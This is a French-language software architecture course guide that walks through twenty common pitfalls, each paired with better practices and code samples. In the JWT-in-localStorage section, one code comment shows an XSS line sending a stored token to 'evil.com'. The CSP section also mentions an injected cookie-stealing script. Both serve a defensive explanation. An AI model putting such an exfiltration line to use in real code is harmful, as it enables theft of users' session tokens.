# 00 — Les 20 Pieges Fréquents en Architecture Logicielle

> Un guide de survie pour ne pas répéter les erreurs que tout le monde a déjà faites.
> Chaque piege est une cicatrice collective de l'industrie.

---

## Comment lire ce document

Pour chaque piege :
- Le **titre entre guillemets** est la phrase exacte qu'on entend dans les reunions.
- **Ce qui se passe** explique le mécanisme du desastre.
- **Ce qu'on fait plutot** donne la sortie de secours.
- **Le code** montre la différence concrète.
- **Cours associes** pointent vers la théorie complete.

---

## 1. "On m'a dit microservices"

> *"Notre CTO a dit qu'on devait faire des microservices. On a coupe notre appli en 12 services. Maintenant chaque feature touche 5 repos et déployer prend 3 heures."*

**Ce qui se passe :** Vous avez créé un **monolithe distribue**. Les services se parlent en synchrone (HTTP), partagent la même base de données (où pire, ont des bases qui se requetent mutuellement), et un changement de schema nécessité de déployer 6 services en ordre précis. Vous avez tous les inconvenients des microservices (complexité réseau, observabilité, transactions distribuees) sans aucun de leurs avantages (scalabilité independante, isolation des pannes).

**Ce qu'on fait plutot :**
1. Commencer par un **monolithe module** (un seul deployable, mais avec des modules internes bien separes)
2. Identifier les vrais points de stress (scaling, équipes, disponibilité differenciee)
3. N'extraire en service que ce qui à un besoin **prouve** d'autonomie

```
MONOLITHE DISTRIBUE (piege)          MONOLITHE MODULE (correct d'abord)
─────────────────────────────        ─────────────────────────────────
[Order Service] --HTTP--> [Inv]      ┌─────────────────────────────┐
     |                               │  Monolith                   │
     v                               │  ┌────────┐  ┌──────────┐  │
[Payment Svc]                        │  │ Orders │  │ Inventory│  │
     |                               │  └────┬───┘  └────┬─────┘  │
     v                               │       │ interface │         │
[Notification Svc]                   │       └────────────┘         │
     |                               └─────────────────────────────┘
     v
[User Svc]  // Chaque fleche = point de defaillance reseau
```

**Cours associes :** 10 (Microservices), 11 (Architecture distribuee)

---

## 2. "SOLID partout"

> *"J'ai applique SOLID rigoureusement. Maintenant pour afficher une liste d'articles il faut traverser 14 classes et 7 interfaces."*

**Ce qui se passe :** **Over-engineering**. SOLID est un guide, pas une religion. Extraire une interface pour une seule implémentation concrete, créer un Factory pour un objet qui ne change jamais, injecter une Strategy quand il n'y a qu'un seul cas — tout ça ajoute de l'indirection sans valeur. Le code devient plus difficile a lire qu'un script procedural.

**Ce qu'on fait plutot :** Appliquer SOLID uniquement quand la variabilite est **réelle et previsible**. Ne pas anticiper des extensions hypothetiques. Le principe YAGNI (You Ain't Gonna Need It) est l'antidote.

```typescript
// MAUVAIS — interface pour une seule implementation
interface ArticleTitleFormatter {
  format(title: string): string;
}
class DefaultArticleTitleFormatter implements ArticleTitleFormatter {
  format(title: string): string { return title.trim(); }
}

// BON — une fonction suffit
function formatTitle(title: string): string {
  return title.trim();
}

// Interface = justifiee quand plusieurs implementations existent
// et qu'elles sont substitutables (test + production par ex.)
interface PaymentGateway {
  charge(amount: Money, token: string): Promise<ChargeResult>;
}
class StripeGateway implements PaymentGateway { /* ... */ }
class MockPaymentGateway implements PaymentGateway { /* tests */ }
```

**Cours associes :** 2 (SOLID), 4 (Principes de design)

---

## 3. "Cache partout"

> *"On a mis du cache sur toutes les endpoints. Maintenant les utilisateurs voient des données perimees depuis 3 jours et on ne sait plus quoi invalider."*

**Ce qui se passe :** L'invalidation de cache est l'un des deux problèmes les plus difficiles en informatique (avec le nommage). Sans stratégie d'invalidation rigoureuse, le cache devient un mirroir menteur. Mettre du cache sans définir sa politique d'invalidation créé des bugs de cohérence très difficiles a reproduire.

**Ce qu'on fait plutot :** Pour chaque cache, documenter explicitement : quand est-il perime ? qui l'invalide ? que se passe-t-il si l'invalidation échoué ?

```typescript
// MAUVAIS — TTL arbitraire, pas d'invalidation sur changement
async getArticle(id: string): Promise<Article> {
  const cached = await redis.get(`article:${id}`);
  if (cached) return JSON.parse(cached);
  const article = await db.findById(id);
  await redis.set(`article:${id}`, JSON.stringify(article), 'EX', 3600); // 1h "ca devrait aller"
  return article;
}

// BON — invalidation explicite sur mutation
async publishArticle(id: string): Promise<void> {
  await db.update(id, { status: 'Published' });
  // Invalidation immediate apres chaque mutation
  await redis.unlink(`article:${id}`);
  await redis.unlink(`tenant:${tenantId}:articles:list:*`); // toutes les listes
}
```

**Cours associes :** 62 (Stratégies de cache), 63 (Invalidation de cache)

---

## 4. "Eventual consistency partout"

> *"On a lu sur la consistency, on a mis des queues partout. Maintenant le client commande et son stock n'est pas decremente pendant 10 secondes. Il y a des doubles ventes."*

**Ce qui se passe :** L'eventual consistency est un **compromis**, pas une architecture universelle. Elle est adaptee quand la latence de propagation est acceptable et les conflits rares. Pour une reservation de stock, elle est desastreuse : deux clients commandent le dernier article, les deux validations passent, stock passe a -1.

**Ce qu'on fait plutot :** Identifier le **vrai besoin de consistance**. Forte consistance pour les opérations critiques (paiement, stock, reservation), eventual pour ce qui peut attendre (analytics, recommendations, emails).

```
MAUVAIS              BON
────────             ───────────────────────────────────────
Order -> Queue       Commande critique :  Notification email :
         |            Order ─[TX]─> Stock  Order -> Queue -> Email
         v            (meme transaction)   (eventual = OK, pas critique)
       Stock          Stock decremente
       (10s later)    immediatement
```

**Cours associes :** 49 (Patterns distribues), 55 (Saga pattern)

---

## 5. "Un store global"

> *"On a tout mis dans Redux. Maintenant le store a 200 clés, chaque composant re-render quand n'importe quoi change, et personne ne sait ce que contient le store."*

**Ce qui se passe :** **God Store** — un store global qui contient l'état de toute l'application. Le moindre changement d'état déclenché des re-renders en cascade. Les selectors sont lents. Les mutations deviennent impossibles a tracer. Le store devient un second backend non documente.

**Ce qu'on fait plutot :** Hierarchiser l'état : local (useState), partage local (Context/parent), global uniquement si vraiment global (auth, theme, notifications). Diviser le store global en slices independants.

```typescript
// MAUVAIS — tout dans un store global
const globalStore = {
  user: User,
  articles: Article[],
  currentArticleId: string,
  editFormData: Partial<Article>,  // <- etat UI dans le store global!
  modalOpen: boolean,              // <- etat UI!
  pagination: { page: number; total: number },
  filters: { tag: string; status: string },
  // ... 150 autres champs
};

// BON — etat au bon niveau
// Local : etat du formulaire reste dans le composant
const [formData, setFormData] = useState<Partial<Article>>();

// Store global : seulement ce qui est vraiment global
const authStore = { user: User | null };           // Zustand slice Auth
const notifStore = { notifications: Notification[] }; // Zustand slice Notifs

// Feature store : scoped a la feature, pas global
const articleStore = useArticleStore();  // charge les articles de la vue courante
```

**Cours associes :** 34 (State management frontend)

---

## 6. "CSP unsafe-inline"

> *"Le CSP bloquait nos scripts inline, alors on a ajoute unsafe-inline. Maintenant on est 'CSP-compliant' techniquement, mais sans protection réelle."*

**Ce qui se passe :** `unsafe-inline` **annule** l'intérêt du Content Security Policy. Une CSP existe pour empecher l'injection de scripts malveillants (XSS). Autoriser `unsafe-inline` revient a dire "tous les scripts inline sont OK" — y compris ceux injectes par un attaquant.

**Ce qu'on fait plutot :** Externaliser les scripts inline dans des fichiers `.js`, ou utiliser des **nonces** (valeur aleatoire par requête) pour autoriser des scripts spécifiques de façon selective.

```
# MAUVAIS — CSP inutile
Content-Security-Policy: script-src 'self' 'unsafe-inline'
# Un attaquant peut injecter <script>stealCookies()</script>

# BON — Nonce par requete
Content-Security-Policy: script-src 'self' 'nonce-{random-per-request}'

# Dans le HTML :
<script nonce="abc123def456">/* ce script specifique est autorise */</script>
# Un script injecte sans le nonce valide sera bloque
```

**Cours associes :** 58 (Content Security Policy), cours sécurité frontend

---

## 7. "On va tout refactoriser d'un coup"

> *"Le code legacy est vraiment mauvais. On a decide de tout réécrire from scratch. 8 mois plus tard, le projet est annule, l'équipe est epuisee, et le nouveau code a les memes problèmes."*

**Ce qui se passe :** Le **Big Bang Rewrite**. Joel Spolsky appelait ça "la pire decision stratégique qu'une societe puisse prendre". Le code legacy, aussi laid soit-il, contient des annees de corrections de bugs, de cas limites, de règles métier implicites. Tout réécrire, c'est aussi tout perdre et tout re-apprendre.

**Ce qu'on fait plutot :** **Strangler Fig Pattern** — etrangler l'ancienne appli progressivement, feature par feature, sans jamais arreter de livrer.

```
STRANGLER FIG PATTERN (bon)
                                          nouveau code
  [ Legacy ]  <─── Proxy/Router ───>  [ Feature A v2 ]
                         |            [ Feature B v2 ]
                         |
                         └──────────> [ Legacy Feature C ] (pas encore migree)

  On redirige progressivement le trafic. Jamais de freeze.
  La migration prend 12 mois mais on livre en permanence.
```

**Cours associes :** 79 (Migration legacy), 54 (Strangler Fig)

---

## 8. "Les tests ralentissent le développement"

> *"On n'a pas le temps d'écrire des tests. On livrera les tests après. Ça fait 2 ans, pas de tests, et chaque deploy est une russian roulette."*

**Ce qui se passe :** **Dette technique exponentielle**. Sans tests, chaque correction de bug peut en introduire trois nouveaux invisibles. La regression détection dépend des utilisateurs en production. La vitesse initiale (pas de tests = livraison rapide) s'inverse : sans filet, les développeurs deviennent paralytiques, les PRs prennent des heures de review manuelle, les deploys sont bloques.

**Ce qu'on fait plutot :** Tests unitaires du domaine (rapides, pas de BDD), tests d'intégration pour les cas critiques. Commencer petit — même 30% de coverage sur le code métier change radicalement la confiance.

```typescript
// SANS TEST — un deploy = stress
async function publishArticle(id: string) {
  // 200 lignes, aucun test, "ca marche sur ma machine"
}

// AVEC TEST — domaine pur, zero infra, s'execute en 2ms
describe('Article.publish()', () => {
  it('transitions from Draft to Published', () => {
    const article = Article.create({ /* ... */ });
    article.publish();
    expect(article.status).toBe('Published');
  });

  it('rejects publish from Archived', () => {
    const article = buildArchivedArticle();
    expect(() => article.publish()).toThrow(InvalidTransitionError);
  });
});
// 2ms, zero BDD, zero reseau, 100% deterministeite
```

**Cours associes :** 73 (Testing strategy)

---

## 9. "DDD partout"

> *"On fait du DDD. J'ai créé des Agregats, des Value Objects, des Domain Events... pour sauvegarder un formulaire de contact (nom, email, message)."*

**Ce qui se passe :** **Over-modeling CRUD**. Le DDD est couteux (Event Storming, modélisation profonde, ceremonies d'équipe). Pour un CRUD basique, il ajoute une complexité enorme sans valeur. Un formulaire de contact est un `INSERT INTO contact_forms`. Pas besoin d'un Agregat `ContactRequest` avec un `ContactSubmitted` Domain Event.

**Ce qu'on fait plutot :** Appliquer le DDD uniquement au Core Domain (la ou la complexité métier est réelle). Pour les supporting et generic subdomains : CRUD simple, DTO direct, pas de ceremonie.

```typescript
// OVER-ENGINEERING — formulaire de contact avec DDD
class ContactRequest {                // Agregat
  private _id: ContactRequestId;     // ValueObject
  private _email: Email;             // ValueObject
  private _submittedAt: Date;
  submit(): void {
    this._domainEvents.push(new ContactSubmitted(this._id, this._email));
  }
}
// ... 150 lignes pour INSERT INTO contact_forms

// SUFFISANT pour ce cas
async function submitContact(dto: { name: string; email: string; message: string }) {
  await db.query(
    'INSERT INTO contact_forms (name, email, message) VALUES ($1, $2, $3)',
    [dto.name, dto.email, dto.message]
  );
  await mailer.send({ to: 'admin@site.com', subject: 'Nouveau contact', body: dto.message });
}
```

**Cours associes :** 14 (Introduction DDD — quand l'utiliser), 16 (Entités & VO)

---

## 10. "Pas de schema pour NoSQL"

> *"On utilise MongoDB parce que c'est flexible, pas besoin de schema. Maintenant on a des documents avec des champs différents dans la même collection et on ne sait plus ce qu'on peut truster."*

**Ce qui se passe :** **Schema implicite**. L'absence de schema ne signifie pas l'absence de structure : cela signifie que la structure est dans votre tete et dans le code epars. Chaque service suppose des champs différents, les migrations deviennent impossibles, et un bug de serialisation corrompt silencieusement des milliers de documents.

**Ce qu'on fait plutot :** Définir un schema explicite même avec NoSQL (Mongoose schemas, JSON Schema validation, Zod au niveau applicatif). Versionner les schemas comme du code.

```typescript
// MAUVAIS — schema implicite
await db.collection('articles').insertOne({
  title: 'Mon article',  // string?
  content: 'Contenu',   // parfois "body", parfois "content", parfois "text"
  // tags: manquant sur certains documents
  // authorId: parfois number, parfois string selon la version
});

// BON — schema explicite avec validation
const ArticleSchema = z.object({
  _id: z.string().uuid(),
  title: z.object({ fr: z.string(), en: z.string().optional() }),
  body: z.object({ fr: z.string(), en: z.string().optional() }),
  authorId: z.string().uuid(),
  tags: z.array(z.string()).default([]),
  status: z.enum(['Draft', 'Published', 'Archived']),
  schemaVersion: z.literal(2), // pour les migrations
});

// Validation avant insert — jamais d'exception silencieuse
const parsed = ArticleSchema.parse(rawData);
await db.collection('articles').insertOne(parsed);
```

**Cours associes :** 31 (Architecture BDD NoSQL)

---

## 11. "Front sans architecture"

> *"C'est juste du frontend. On a fait des components React. Maintenant l'appli a 80 components, la logique métier est dans les event handlers, les appels API sont dans les onClick, et personne ne touche au code sans avoir peur."*

**Ce qui se passe :** **Spaghetti frontend**. Sans architecture, la logique métier se retrouve dans les composants, les appels API dans les handlers, l'état duplique entre composants. Le frontend devient aussi difficile a maintenir qu'un backend sans couches.

**Ce qu'on fait plutot :** Separer présentation (composants), logique (hooks/stores/use-cases), et accès aux données (services/repositories). Les composants ne font que render et dispatcher des actions.

```typescript
// MAUVAIS — logique dans le composant
function ArticleCard({ id }: { id: string }) {
  const handlePublish = async () => {
    const res = await fetch(`/api/articles/${id}`, {
      method: 'PATCH',
      body: JSON.stringify({ status: 'Published' }),
    });
    if (res.ok) { window.location.reload(); } // brr
  };
  return <button onClick={handlePublish}>Publier</button>;
}

// BON — composant pur, logique externalisee
function ArticleCard({ id }: { id: string }) {
  const { publish, isPublishing } = useArticleActions(id); // hook
  return <button onClick={publish} disabled={isPublishing}>Publier</button>;
}

// Hook — logique isolee, testable
function useArticleActions(articleId: string) {
  const queryClient = useQueryClient();
  const mutation = useMutation({
    mutationFn: () => articleService.publish(articleId),
    onSuccess: () => queryClient.invalidateQueries(['articles']),
  });
  return { publish: mutation.mutate, isPublishing: mutation.isPending };
}
```

**Cours associes :** 33 (Architecture frontend), 34 (State management)

---

## 12. "J'ai fait mon propre framework"

> *"Les frameworks existants ne nous convenaient pas exactement. On a créé le notre. 3 ans plus tard, on maintient un framework et un produit, avec une équipe de 4 personnes."*

**Ce qui se passe :** **NIH Syndrome (Not Invented Here)**. Créer un framework maison signifie : zero documentation publique, zero communauté, zero recrutement facile, chaque bug est le votre a résoudre, chaque sécurité patch est le votre a implémenter. Le cout de maintenance est phenomenal.

**Ce qu'on fait plutot :** Utiliser les frameworks etablis. Contribuer a l'open source si les manques sont réels. Ne créer une abstraction maison que pour coller plusieurs librairies etablies ensemble — jamais pour remplacer un framework mature.

```
COÛT COMPARATIF
                   Framework etabli    Framework maison
Documentation :    Community wiki      Vous l'ecrivez
Securite patch :   Release auto        Vous le codez
Recrutement :      "React dev wanted"  "Notre framework interne..."
Debug :            Stack Overflow      Vous etes Stack Overflow
Upgrade :          CHANGELOG           Vous ecrivez le CHANGELOG
```

**Cours associes :** 4 (Principes de design), 83 (Architecture évolutive)

---

## 13. "Ça marche en local"

> *"En local ça marche parfaitement. En prod ça crashe toutes les heures. On n'a pas de staging."*

**Ce qui se passe :** L'environnement local est un mensonge confortable. Pas de latence réseau réelle, pas de charge, pas de vraies credentials, pas de certificats TLS, version de Node différente de prod, variables d'environnement hardcodees. Sans staging, chaque deploy est un test en production.

**Ce qu'on fait plutot :** Staging = miroir de production. Memes services, même infrastructure-as-code, même pipeline CI. Tester le deploy en staging avant prod. Feature flags pour le rollout progressif.

```
ENVIRONNEMENTS REQUIS
  Local  -> Developpement rapide (peut etre different)
  CI     -> Tests automatises (doit etre identique a prod pour les tests)
  Staging -> Clone de prod (meme IaC, meme data anonymisee)
  Prod   -> Production

  REGLE : si ca passe en staging, ca passe en prod.
  Staging = filet de securite avant le saut.
```

**Cours associes :** 71 (CI/CD), 72 (Infrastructure as Code)

---

## 14. "JWT dans localStorage"

> *"On stocke les JWT dans localStorage parce que c'est simple. Un audit de sécurité a trouve qu'un script tiers injecte dans la page peut lire tous les tokens."*

**Ce qui se passe :** **XSS token theft**. LocalStorage est accessible depuis n'importe quel script JavaScript s'exécutant sur la page, y compris les scripts injectes par une attaque XSS ou un package npm compromis. Un attaquant peut exfiltrer le token et usurper l'identité indefiniment.

**Ce qu'on fait plutot :** Stocker les tokens dans des cookies `HttpOnly; Secure; SameSite=Strict`. Ces cookies ne sont pas accessibles en JavaScript. Couple avec un bon CSP, le risque d'exfiltration est quasi nul.

```typescript
// MAUVAIS — localStorage accessible au JS
localStorage.setItem('token', jwt);
// Un XSS peut faire : fetch('https://evil.com?t=' + localStorage.getItem('token'))

// BON — cookie HttpOnly, invisible au JS
res.cookie('auth_token', jwt, {
  httpOnly: true,    // inaccessible a document.cookie
  secure: true,      // HTTPS uniquement
  sameSite: 'strict', // pas envoye depuis un site tiers (anti-CSRF)
  maxAge: 15 * 60 * 1000, // 15 minutes (access token court)
});
// Le navigateur envoie automatiquement le cookie, le JS ne peut pas le lire
```

**Cours associes :** 21 (Authentification & JWT), 58 (Sécurité frontend)

---

## 15. "La sécurité, on verra après"

> *"On finit les features d'abord, la sécurité c'est pour la v2. La v2 est sortie. La v3 aussi. Pas de sécurité."*

**Ce qui se passe :** **Security bolt-on**. La sécurité ajoutee après coup coute 10 a 100 fois plus cher qu'intégrée des le debut. Les vecteurs d'attaque sont entrelaces avec la logique métier, les corrections necessitent des refactorisations profondes, et entre la v1 non sécurisée et la correction, il y à une fenêtre de vulnérabilité.

**Ce qu'on fait plutot :** **Shift left security** — intégrer la sécurité des le design. Threat modeling en conception, SAST dans la CI, revues de code avec checklist sécurité, penetration testing avant chaque release majeure.

```
COUT DE CORRECTION SELON LA PHASE
  Design :         1x (changer une decision de design)
  Developpement :  10x (refactoriser du code)
  Test :           25x (corriger + re-tester)
  Production :     100x (incident + patch + communication + audit)

  La securite n'est pas une feature. C'est une contrainte transverse.
```

**Cours associes :** 56 (OWASP Top 10), 61 (Secure by design)

---

## 16. "HTTP 200 avec une erreur dans le body"

> *"Notre API retourne toujours 200. Si c'est une erreur, il y à un champ 'error' dans le JSON. Nos clients doivent lire le body pour savoir si ça a marche."*

**Ce qui se passe :** **Anti-pattern API**. Les codes HTTP existent precisement pour signaler le succes ou l'echec sans lire le body. Les proxies, les load balancers, les outils de monitoring, les retry policies — tous utilisent le code HTTP. Un 200 avec erreur dans le body trompe toute l'infrastructure et force chaque client a implémenter sa propre logique de détection d'erreur.

**Ce qu'on fait plutot :** Utiliser les codes HTTP correctement. 200 = succes. 400 = erreur client (input invalide). 401 = non authentifie. 403 = non autorise. 404 = ressource inexistante. 422 = validation failed. 500 = erreur serveur.

```typescript
// MAUVAIS — 200 avec erreur cachee
app.post('/articles', (req, res) => {
  res.status(200).json({
    success: false,  // <- le client doit lire ca
    error: 'Article title is required',
  });
});

// BON — code HTTP semantique + body structuré
app.post('/articles', (req, res) => {
  if (!req.body.title) {
    return res.status(422).json({
      error: 'VALIDATION_ERROR',
      message: 'Article title is required',
      field: 'title',
    });
  }
  // ...
  res.status(201).json(createdArticle); // 201 Created, pas 200
});

// Les retry automatiques s'arretent sur 422 (erreur client)
// et reessaient sur 503 (erreur serveur temporaire)
// Impossible avec 200 partout
```

**Cours associes :** 19 (REST API design), 24 (Error handling patterns)

---

## 17. "Pas de rate limiting en interne"

> *"Le rate limiting c'est pour les APIs publiques. En interne, les services se font confiance. Un script bugge, il fait 50 000 requêtes en 1 minute et notre BDD est a genoux."*

**Ce qui se passe :** **Lateral movement** et **self-DDOS**. Sans rate limiting interne, un service bugge (boucle infinie, retry storm) ou compromis peut saturer toute l'infrastructure. Le perimetre de confiance "interne = sur" est une illusion : une injection de code, un secret exfiltre, ou un simple bug peut provoquer la même chose qu'une attaque externe.

**Ce qu'on fait plutot :** Rate limiting sur chaque service, même interne. Circuit breaker pour les appels inter-services. Quotas par tenant dans une appli multi-tenant.

```typescript
// Rate limiting par tenant avec Redis (token bucket)
class TenantRateLimiter {
  constructor(private readonly redis: RedisClient) {}

  async checkLimit(tenantId: string, action: string, limit: number, windowMs: number): Promise<boolean> {
    const key = `rl:${tenantId}:${action}`;
    const current = await this.redis.incr(key);

    if (current === 1) {
      await this.redis.pexpire(key, windowMs);
    }

    if (current > limit) {
      throw new RateLimitExceededError(
        `Tenant ${tenantId} exceeded ${limit} ${action} per ${windowMs}ms`
      );
    }
    return true;
  }
}

// Usage : 100 publications par heure par tenant
await rateLimiter.checkLimit(tenantId, 'publish_article', 100, 3600000);
```

**Cours associes :** 59 (Rate limiting & throttling), 22 (API Gateway patterns)

---

## 18. "On va juste scaler verticalement"

> *"Nos serveurs sont a 80% CPU. On passe de 8 a 32 cores. Ça a coute 5x plus cher et dans 6 mois on sera de nouveau a 80%."*

**Ce qui se passe :** Le **scaling vertical** (machines plus puissantes) à un plafond physique et un cout exponentiel. A partir d'un certain point, doubler les ressources coute 4x et ne double pas les performances (contention, Amdahl's law). Et si la machine tombe, tout tombe.

**Ce qu'on fait plutot :** Identifier ce qui peut etre scale horizontalement (sans état) et ce qui ne peut pas (avec état). Stateless services -> scale horizontal trivial. Base de données -> read replicas, sharding, caching. Concevoir stateless des le debut.

```
SCALING VERTICAL (piege)         SCALING HORIZONTAL (solution)
────────────────────────         ──────────────────────────────
  [GROS SERVEUR]                  [app1] [app2] [app3]  <- stateless
  CPU: 128 cores                       |    |    |
  RAM: 512 GB                     [Load Balancer]
  Coût: 10 000 EUR/mois                |
  SPOF: 1 machine = tout tombe    [Redis] [PostgreSQL + replicas]

  Ceiling physique : 1 machine    Ceiling : infini (theoriquement)
```

**Cours associes :** 65 (Scalabilite horizontale)

---

## 19. "L'architecture qu'on a choisie en 2019 est toujours bonne"

> *"On a decide de notre architecture il y a 5 ans. On continue malgre les nouveaux besoins. Le code est un musee."*

**Ce qui se passe :** **Architecture fossile**. Les decisions architecturales sont des paris sur l'avenir. Les besoins changent, les équipes changent, les technologies evoluent. Une architecture figee devient un frein : les nouvelles features sont difficiles a ajouter, les développeurs contournent les contraintes, la dette s'accumule.

**Ce qu'on fait plutot :** **Architecture Decision Records (ADR)** pour documenter le contexte de chaque decision. Revues d'architecture régulières. Fitness functions pour vérifier que l'architecture repond toujours a ses objectifs. Permettre l'évolution incrementale.

```markdown
# ADR-042 — Adoption de Redis pour le cache articles

## Statut : Remplace par ADR-067

## Contexte (2021)
Besoin de cache pour les articles publies, charge < 10k req/s

## Decision
Redis avec TTL de 1h

## Consequences
+ Reduit la charge PostgreSQL de 80%
- Complexite de l'invalidation

## Revue 2024 — Raison de remplacement
Volume > 100k req/s, besoin de CDN edge caching
Redis reste pour session, CDN pour contenu statique
```

**Cours associes :** 83 (Architecture évolutive)

---

## 20. "La loi de Conway ne s'applique pas a nous"

> *"On a concu l'architecture logicielle en premier. Ensuite on a organise les équipes. Maintenant les équipes se battent pour posséder les services et chaque PR touche 3 équipes."*

**Ce qui se passe :** **Loi de Conway en action**. Melvin Conway (1967) : "Les organisations qui concoivent des systèmes produisent des systèmes dont la structure est une copie de la structure de communication de l'organisation." Si 3 équipes doivent collaborer pour sortir une feature, la feature sera lente, conflictuelle, et le système refletera cette friction.

**Ce qu'on fait plutot :** Appliquer le **Inverse Conway Maneuver** — concevoir les équipes pour qu'elles correspondent aux Bounded Contexts voulus. Une équipe = un contexte = autonomie de déploiement. Utiliser Team Topologies (Stream-aligned, Enabling, Complicated-subsystem, Platform teams).

```
CONWAY INVOLONTAIRE (piege)      INVERSE CONWAY (solution)
───────────────────────────      ───────────────────────────
  [Equipe BDD]                     [Equipe Catalogue]
  [Equipe Backend]     <- friction  - Service catalogue
  [Equipe Frontend]                 - Son propre schema
                                    - Deploie seule
  Chaque feature = coordination     [Equipe Commande]
  de 3 equipes = lenteur            - Service commande
                                    - Son propre schema
                                    - Deploie seule
                                   [Equipe Paiement]
                                    - Service paiement
                                    - Deploie seule
```

**Cours associes :** 82 (Conway's Law & Team Topologies)

---

## Tableau de bord rapide

| # | Piege | Signal d'alarme | Solution clé |
|---|---|---|---|
| 1 | Monolithe distribue | "5 services pour 1 feature" | Monolithe module d'abord |
| 2 | Over-engineering SOLID | "14 classes pour 1 liste" | YAGNI, interface = variabilite réelle |
| 3 | Cache sans invalidation | "Données perimees depuis 3j" | Invalidation sur mutation explicite |
| 4 | Eventual consistency forcee | "Doublons de stock" | Forte consistance pour ops critiques |
| 5 | God Store | "200 clés dans Redux" | État au bon niveau, slices independants |
| 6 | CSP unsafe-inline | "XSS possible" | Nonces, scripts externes |
| 7 | Big Bang Rewrite | "Projet annule après 8 mois" | Strangler Fig, migration incrementale |
| 8 | Pas de tests | "Deploy = roulette russe" | Tests domaine purs, rapides |
| 9 | DDD sur CRUD | "VO pour formulaire de contact" | DDD = Core Domain uniquement |
| 10 | NoSQL sans schema | "Champs inconsistants" | Schema explicite + validation |
| 11 | Frontend spaghetti | "Logique dans onClick" | Séparation présentation/logique/données |
| 12 | Framework maison | "On maintient un framework ET un produit" | Standards etablis, contribuer |
| 13 | "Marche en local" | "Pas de staging" | Staging = miroir prod |
| 14 | JWT localStorage | "XSS vole les tokens" | Cookie HttpOnly + SameSite |
| 15 | Sécurité après | "La sécurité c'est pour la v2" | Shift left, threat modeling |
| 16 | 200 + erreur body | "Clients lisent un champ 'error'" | Codes HTTP semantiques |
| 17 | Pas de rate limiting interne | "Script bugge = BDD a terre" | Rate limit partout, circuit breaker |
| 18 | Scale vertical only | "Plafond physique atteint" | Stateless + scale horizontal |
| 19 | Architecture figee | "Museum code" | ADR + fitness functions |
| 20 | Ignorer Conway | "3 équipes pour 1 PR" | Inverse Conway, Team Topologies |

---

> **Lien fil rouge — ShopArch**
>
> - Revois ShopArch à la lumière des pièges fréquents : God Object, premature optimization, cargo cult
> - Vérifie que le store Zustand de ShopArch n'est pas un God Store (découpage par feature)
> - Checkpoint : Module 00, critère 3
